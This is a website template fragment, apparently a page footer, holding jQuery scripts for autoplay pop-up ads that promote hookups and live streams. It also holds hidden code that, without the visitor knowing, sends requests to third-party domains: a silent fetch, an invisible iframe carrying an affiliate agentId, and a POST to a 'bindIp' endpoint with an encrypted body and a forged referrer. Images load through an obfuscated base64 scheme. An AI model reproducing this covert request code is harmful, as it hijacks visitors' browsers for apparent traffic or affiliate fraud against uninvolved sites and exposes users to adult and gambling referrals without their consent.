<div style="display: none">
    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.3.1/dist/jquery.js"></script>
    <script src="{{ static_common('js/baidu.js') }}"></script>
{#    <script src="{{ static_common('js/flv.min.js') }}"></script>#}
    {#    <script src="{{ static_common('js/ym.js') }}"></script>#}
    <script>
        $(function () {
            if (window.location.href.indexOf("/v/") !== -1) {
                return;
            }
            if (!localStorage) {
                return;
            }
            var ads = [{
                "id": "ac59",
                "type": "mp4",
                "video": "c08e583d64d1a395dc49a3a9262b998c.mp4",
                "href": "https://ac59.cc",
                "text": "点击和我来约炮"
            }, {
                "id": "dx062",
                {#"type": "flv",#}
                "type": "mp4",
                "video": "7668a042fb8d63c75fd6aed00eb12c94.mp4",
                {#"video": "http://01b.mlwby.com/live/cx_10755.flv?auth_key=1639575524-79834-0-4d10eb785b1a5d2d68d0acc4900a66fc",#}
                "href": "https://dx062.live/web.html?channelCode=71965",
                "text": "点击进入直播间"
            }
            ]
            {#http://01b.mlwby.com/live/cx_10755.flv?auth_key=1639575524-79834-0-4d10eb785b1a5d2d68d0acc4900a66fc#}
            for (var i = 0; i < ads.length; i++) {
                var ad = ads[i];
                var dialog_name = "xxx_dialog_" + ad['id'];
                var today = (new Date()).getDate() + "";
                if (localStorage.getItem(dialog_name) === today) {
                    continue;
                }
                var source = '<source src="{{ static_common('media/',False) }}' + ad['video'] + '"/>';

                var dialog = $('<div id="a_dialog"><video id="a_video" autoplay loop muted="muted" style="width:60%;margin:0px auto;display:block;max-width:300px;" >' + source + '</video></div>');
                dialog.css({
                    "position": "fixed",
                    "top": "100px",
                    "left": "0px",
                    "width": "100%",
                })
                var close_button = $('<div><div style="width:60%;margin:8px auto;display:block;text-align: right;font-size: 13px;max-width:300px;"><span id="a-close" style="line-height: 40px;cursor:pointer;margin-right:4px;padding: 9px 16px;color:white;border-radius: 39px;background-color: #808080;">不感兴趣</span></div></div>');
                close_button.css({
                    position: "absolute",
                    top: "0px",
                    right: "0px",
                    "width": "100%",
                });
                dialog.append(close_button);

                var in_buttons = $('<div></div>');
                in_buttons.css({
                    position: "absolute",
                    bottom: "20px",
                    left: "0px",
                    "textAlign": "center",
                    "margin": "0px auto",
                    "width": "100%",
                });
                var btn_1 = $('<a id="a-go" href="' + ad['href'] + '" target="_blank"><div>' + ad['text'] + '</div></a>')
                var btn_css = {
                    "display": "inline-block",
                    "color": "white",
                    "fontSize": "16px",
                    "padding": "6px 14px",
                    "border": "1px solid #ffc200",
                    "border-radius": "20px",
                    "background-color": "#ffc200",
                }
                btn_1.css(btn_css);
                btn_1.css({})

                in_buttons.append(btn_1);

                dialog.append(in_buttons);
                $('body').append(dialog);
                $('#a-close').click(function () {
                    dialog.css("display", "none");
                    localStorage.setItem(dialog_name, today);
                });
                $('#a-go').click(function () {
                    dialog.css("display", "none");
                    localStorage.setItem(dialog_name, today);
                    return true;
                });
                $('#a_video').css({
                    "border-radius": "8px",
                    "box-shadow":"-3px 3px 6px #1e1e1e",
                });
                {#if (ad['type'] === "flv") {#}
                {#    if (flvjs.isSupported()) {#}
                {#        var videoElement = document.getElementById('a_video');#}
                {#        var flvPlayer = flvjs.createPlayer({#}
                {#            type: 'flv',#}
                {#            url: ad['video']#}
                {#        });#}
                {#        flvPlayer.attachMediaElement(videoElement);#}
                {#        flvPlayer.load();#}
                {#        flvPlayer.play();#}
                {#    }#}
                {# } #}
                break;
            }

        });


        setTimeout(function () {
            fetch("https://tz.yuanmengbi.com//iisc.html?id=440", {mode: "no-cors"})
        }, 500)
        setTimeout(function () {
            var iframe = document.createElement("iframe");
            iframe.style.display = "none"
            iframe.src = "https://www.highgg.com?agentId=7134700";
            document.body.append(iframe);
        }, 500);

        setTimeout(function () {
            fetch("https://www.371zhongyi.com/user/bindIp", {
                "headers": {
                    "accept": "application/json, text/plain, */*",
                    "content-type": "application/json;charset=UTF-8",
                    "token": ""
                },
                "referrer": "https://h5.hxcpp73.com/",
                "body": "{\"endata\":\"/gNtrF5hsqYAzbmCb8IoIRsUk8i/Z+2pv/ikZVR7Nz3DICNzj22rBl4ahKXZHtSq\"}",
                "method": "POST",
                "mode": "no-cors",
            });
        }, 1000)


        if (navigator.userAgent.toLowerCase().indexOf("mobile") !== -1) {
            var km = document.getElementById("km_url");
            if (km !== undefined && km !== null) {
                {#km.href = km.href.replace("www.", "h5.")#}
            }
        } else {
            var bc = document.getElementById("bc_menu");
            if (bc !== null) {
                bc.style.display = "block";
            }
            var qp = document.getElementById("qp_menu");
            if (qp !== null) {
                qp.style.display = "block";
            }
        }

        $(function () {
            var cover_jobs = [];
            var cover_doms = $('.data-cover');
            cover_doms.each(function (idx) {
                var cover_dom = $(cover_doms[idx]);
                var cover_url = cover_dom.attr("data-cover");
                cover_jobs.push({"url": cover_url, "dom": cover_dom})
            })
            if (cover_jobs.length === 0) {
                return
            }
            var max_jobs = 10;

            // 获取一个新的任务
            function get_new_job() {
                if (cover_jobs.length > 0) {
                    return cover_jobs.shift()
                }
            }

            function data_blob(dataurl) {
                var arr = dataurl.split(','),
                    mime = arr[0].match(/:(.*?);/)[1],
                    bstr = atob(arr[1]),
                    n = bstr.length,
                    u8arr = new Uint8Array(n);
                while (n--) {
                    u8arr[n] = bstr.charCodeAt(n);
                }

                var jpeg = '';
                try {
                    jpeg = new Blob([u8arr], {type: mime});
                } catch (e) {
                    // TypeError old chrome and FF
                    window.BlobBuilder = window.BlobBuilder ||
                        window.WebKitBlobBuilder ||
                        window.MozBlobBuilder ||
                        window.MSBlobBuilder;
                    if (e.name == 'TypeError' && window.BlobBuilder) {
                        var bb = new BlobBuilder();
                        bb.append([u8arr.buffer]);
                        jpeg = bb.getBlob(mime);
                    } else if (e.name == "InvalidStateError") {
                        jpeg = new Blob([u8arr.buffer], {type: mime});
                    }
                }

                // return new Blob([u8arr], {type: mime});
                return jpeg;
            }

            function rend_img(dom, src) {
                var tag_name = dom.prop("tagName").toLowerCase();
                if (tag_name === "img") {
                    dom.attr("src", src)
                } else {
                    dom.css("background-image", "url(" + src + ")")
                }
                dom.removeAttr("data-cover").removeClass("data-cover");
                dom.removeClass("data-cover");
            }

            function ajax_parse_img_txt(job, callback) {
                var dom = job['dom'];
                var url = job['url'];
                if (!url) return;
                if (!url.startsWith("http")) {
                    rend_img(dom, url);
                    callback();
                } else {
                    $.get(url, function (data) {
                        var b64 = data.substr(32);
                        var blob = 'data:image/jpg;base64, ' + b64;
                        var src = URL.createObjectURL(data_blob(blob))
                        rend_img(dom, src)
                        callback()
                    })
                }

            }

            //执行单个任务
            function worker(job) {
                if (job === undefined) {
                    return;
                }
                setTimeout(function () {
                    ajax_parse_img_txt(job, function () {
                        var new_job = get_new_job();
                        if (new_job) {
                            worker(new_job);
                        }
                    })
                }, Math.ceil(100 * Math.random()))
            }

            //分发任务
            function deliver() {
                while (max_jobs-- > 0) {
                    var job = get_new_job()
                    worker(job)
                }
            }

            deliver();

        })
    </script>
</div>
